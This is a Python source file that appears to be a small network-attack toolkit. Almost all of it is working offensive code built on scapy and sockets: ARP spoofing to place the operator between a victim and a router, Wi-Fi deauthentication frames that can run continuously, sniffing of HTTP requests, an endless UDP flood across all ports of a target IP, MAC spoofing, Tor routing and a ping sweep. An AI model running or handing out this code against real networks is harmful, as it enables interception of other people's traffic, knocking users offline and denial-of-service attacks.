import subprocess #used in macchanging and tor and vpn and connected devices
import os #used in tor, in ddos
import time #used in arp-spoof, in ddos
from scapy.all import ARP, send #used in arp-spoof
from scapy.all import * #used in deauthentication and scapy
from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp#Deauthentication 
from collections import namedtuple #show connected devices
import fcntl #show connected devices
import struct #show connected devices
import re
import sys
from scapy.layers.http import HTTPRequest # in http sniff
import socket #ddos
import random #ddos
import fcntl #connected device 
from collections import namedtuple #connected device

#===========================================================================================================================
#Do sudo apt-get install macchanger to do this
def macchanger():
    interface = input("Enter your network interface : ")
    mac = input("Enter any mac address to spoof : ").strip() # remove any leading/trailing spaces
    subprocess.run(["macchanger", "-m", mac, interface])
#===========================================================================================================================

def resetmac():
    interface = input("Enter your network interface : ")
    subprocess.run(["macchanger", "--permanent", interface])

#===========================================================================================================================
#sudo apt-get install tor torsocks
def torroute():
    # Start Tor service
    tor_process = subprocess.Popen(['sudo', 'service', 'tor', 'start'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = tor_process.communicate()
    # Check if Tor started successfully
    if tor_process.returncode == 0:
        # Configure network settings to use Tor proxy
        os.environ['http_proxy'] = 'socks5h://localhost:9050'
        os.environ['https_proxy'] = 'socks5h://localhost:9050'
        print("Connection routed through Tor successfully!")
    else:
        print("Failed to route connection through Tor. Error message:\n", str(stderr))
#===========================================================================================================================

def torstop():
    # Stop Tor service
    tor_process = subprocess.Popen(['sudo', 'service', 'tor', 'stop'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = tor_process.communicate()
    # Check if Tor stopped successfully
    if tor_process.returncode == 0:
        print("Tor stopped successfully!")
    else:
        print("Failed to stop Tor. Error message:\n", str(stderr))

#=============================================================================================================================
#Here was something...
#
#
#=============================================================================================================================

#pip install scapy
def arp_spoof(victim_ip, victim_mac, router_ip, router_mac):
    send(ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=victim_mac))
    send(ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=router_mac))

#=============================================================================================================================
def arp_spoof_main():
    victim_ip = input("Enter the victim's IP address: ")
    victim_mac = input("Enter the victim's MAC address: ")
    router_ip = input("Enter the router IP: ")
    router_mac = input("Enter the router MAC: ") #type arp -a to get router ip and mac
    while True:
        arp_spoof(victim_ip, victim_mac, router_ip, router_mac)
        time.sleep(1)
#=============================================================================================================================

def deauth():
    iface = input("Enter the name of the interface to use: ")
    bssid = input("Enter the MAC address of the access point (BSSID): ")
    target_mac = input("Enter the MAC address of the target: ")
    count = int(input("Enter the number of deauthentication packets to send (0 for continuous): "))   
    dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
    frame = RadioTap()/dot11/Dot11Deauth()    
    if count == 0:
        sendp(frame, iface=iface, inter=0.1, loop=True)
    else:
        sendp(frame, iface=iface, count=count, inter=0.1)
#=================================================================================================================================
def get_interface_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15].encode())
    )[20:24])

def get_network_devices():
    NetworkDevice = namedtuple('NetworkDevice', ['ip_address', 'mac_address', 'device'])
    devices = []
    output = subprocess.check_output(['arp', '-a'])
    output = output.decode('utf-8').split('\n')
    for line in output:
        if '(' in line and ')' in line:
            ip_address = line.split('(')[1].split(')')[0]
            mac_address = line.split()[3]
            device = line.split(' ')[5].strip('()')
            devices.append(NetworkDevice(ip_address, mac_address, device))
    return devices

def show_devices():
    devices = get_network_devices()
    print('{:<20} {:<20} {:<20}'.format('IP Address', 'MAC Address', 'Device'))
    print('-' * 60)
    for device in devices:
        print('{:<20} {:<20} {:<20}'.format(device.ip_address, device.mac_address, device.device))
#==============================================================================================================

def process_packet(packet):
    if packet.haslayer(HTTPRequest):
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        method = packet[HTTPRequest].Method.decode()
        print(f"{method} {url}")

def sniff_http_traffic():
    interface = input("Enter the name of your network interface (e.g. wlan0): ")
    print(f"Sniffing HTTP traffic on {interface}...\n")
    sniff(filter="tcp port 80", prn=process_packet, iface=interface)

#==============================================================================================================
B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

def udp_flood_attack():
    # Create a UDP socket
    white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Generate 3500 bytes of random data to be sent in each packet
    bytes = random._urandom(3500)
    # Prompt the user to enter the target IP address
    ip = input("[+] Target's IP: ")
    # Clear the screen
    os.system("clear")
    # Print a message indicating that the attack is starting
    print("Attack starting...")
    time.sleep(3)
    # Send packets to every port on the target IP address
    sent = 0
    while True:
        for port in range(1, 65534):
            # Send a packet to the target IP address and port
            white.sendto(bytes, (ip, port))
            # Increment the number of packets sent
            sent += 1
            # Print a message indicating the number of packets sent, the target IP address, and the port number
            print(B + R + f"Send {sent} Packets to {ip} Through port {port}" + N)
#==============================================================================================================
def scan_network(ip_range):
    active_ips = []
    for i in range(1, 255):
        ip = ip_range + str(i)
        response = subprocess.call(['ping', '-c', '1', '-W', '1', ip], stdout=subprocess.DEVNULL)
        if response == 0:
            active_ips.append(ip)
            print(f"\033[92m{ip} is active\033[0m")
        else:
            print(f"\033[91m{ip} is inactive\033[0m")
    return active_ips
